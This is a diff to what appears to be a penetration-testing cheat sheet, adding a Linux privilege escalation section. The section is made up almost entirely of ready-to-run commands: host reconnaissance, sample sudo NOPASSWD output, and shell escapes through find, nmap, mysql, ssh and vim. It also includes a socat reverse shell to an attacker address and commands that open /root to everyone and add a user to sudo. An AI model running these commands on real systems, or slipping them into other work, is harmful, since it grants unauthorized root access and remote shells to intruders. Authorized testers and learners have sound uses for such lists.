@@ -153,6 +153,83 @@ cat dump.sql
 ## Escalate Privileges
 https://github.com/gurkylee/Linux-Privilege-Escalation-Basics
 
+
+```
+uname -a 
+hostname 
+lscpu 
+ls /home 
+ls /var/www/html 
+ls /var/www/
+```
+
+### sudo -l basics
+EXAMPLE OUTPUT:
+
+(root) NOPASSWD: /usr/bin/find
+(root) NOPASSWD: /usr/bin/nmap
+(root) NOPASSWD: /usr/bin/env
+(root) NOPASSWD: /usr/bin/vim
+(root) NOPASSWD: /usr/bin/awk
+(root) NOPASSWD: /usr/bin/perl
+(root) NOPASSWD: /usr/bin/python
+(root) NOPASSWD: /usr/bin/less
+(root) NOPASSWD: /usr/bin/man
+(root) NOPASSWD: /usr/bin/ftp
+(root) NOPASSWD: /usr/bin/socat
+(root) NOPASSWD: /usr/bin/zip
+(root) NOPASSWD: /usr/bin/gcc
+(root) NOPASSWD: /usr/bin/docker
+(root) NOPASSWD: /usr/bin/env
+(root) NOPASSWD: /usr/bin/MySQL
+(root) NOPASSWD: /usr/bin/ssh
+(root) NOPASSWD: /usr/bin/tmux
+(root) NOPASSWD: /usr/bin/pkexec
+(root) NOPASSWD: /usr/bin/rlwrap
+(root) NOPASSWD: /usr/bin/xargs
+(root) NOPASSWD: /usr/bin/anansi_util
+(root) NOPASSWD: /usr/bin/apt-get
+(root) NOPASSWD: /usr/bin/flask run
+(root) NOPASSWD: /usr/bin/apache2
+(root) NOPASSWD: /usr/bin/wget
+
+
+```
+FIND
+sudo find / etc/passwd -exec /bin/bash \;
+find . -exec chmod -R 777 /root \;
+find . -exec usermod -aG sudo user \;
+sudo find /home -exec /bin/bash \;
+```
+
+```
+NMAP
+echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
+$ sudo nmap --interactive
+> !sh
+```
+
+```
+socat
+Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
+Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
+```
+
+```
+mysql
+sudo mysql -e '\! /bin/sh'
+```
+
+```
+ssh
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+```
+
+```
+vim
+sudo vim -c ':!/bin/bash'
+```
+
 ### Execute by adding /bin/bash
 ```
 sudo -u user /bin/bash /var/www/html/start.sh
